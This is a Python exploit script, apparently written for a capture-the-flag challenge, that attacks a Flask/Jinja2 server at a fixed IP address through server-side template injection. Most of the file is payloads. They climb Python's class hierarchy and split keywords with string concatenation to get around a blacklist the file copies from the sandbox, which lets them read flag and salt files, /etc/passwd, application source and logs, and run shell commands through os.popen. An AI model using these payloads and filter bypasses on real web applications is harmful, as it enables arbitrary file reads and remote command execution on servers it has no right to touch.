import requests as req
import HTMLParser

URL = 'http://47.96.118.255:2333/'

# <!--Flag @ /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt-->
# <!--Salt @ /opt/salt_b420e8cfb8862548e68459ae1d37a1d5.txt-->


def decodeHtml(x):
    h = HTMLParser.HTMLParser()
    s = h.unescape(x)
    return s


def p(u):
    res = req.get(URL + u)
    if res.status_code == 404:
        html = res.content[149:-253]
        html = decodeHtml(html)
        print(html)
    else:
        print(res.content)

if __name__ == '__main__':
    pl = "{{123}}"
    # get flag 1
    pl = "{{ config.ENV.__init__['__cla'+'ss__']['__mr'+'o__'][1]['__subcla'+'sses__']()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt').__getattribute__('re'+'ad')() }}"
    # pl = "{{read}}"
    # get salt
    # _Y0uW1llN3verKn0w1t_
    pl = "{{ config.ENV.__init__['__cla'+'ss__']['__mr'+'o__'][1]['__subcla'+'sses__']()[40]('/opt/salt_b420e8cfb8862548e68459ae1d37a1d5.txt').__getattribute__('re'+'ad')() }}"

    pl = "{{ config.ENV }}"
    # pl = "{{config['HTTP']['_connection_cl'+'ass'].__init__['__cl'+'ass__']}}"
    f = "/etc/passwd"
    f = "/home/ctf/config.p'+'yc"
    f = "/opt/app.p'+'y"
    f = "/opt/log/error.log"
    # f = "/proc/self/cmdline"
    pl = "{{ config.ENV.__init__['__cla'+'ss__']['__mr'+'o__'][1]['__subcla'+'sses__']()[40]('%s').__getattribute__('re'+'ad')() }}" % f
    sandbox_black_list = [
        'write', '.py', 'shutdown', '.sql', '.log', 'app'
        'os', 'sys', 'pop', 'del', 'rm', 'eval', 'exec', 'ls', 'cat',
        ';', '&&', 'catch_warnings', 'func_globals', 'pickle',
        'import', 'subprocess', 'commands', 'input', 'execfile',
        'reload', 'compile', 'execfile', 'kill', 'func_code'
    ]

    pl = "{{ config.ENV.__init__['__cla'+'ss__']['__mr'+'o__'][1]['__subcla'+'sses__']()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['po'+'pen']('l'+'s -al /opt/').__getattribute__('re'+'ad')() }}"
    p(pl)
    # import httplib
    # print(httplib.HTTP)
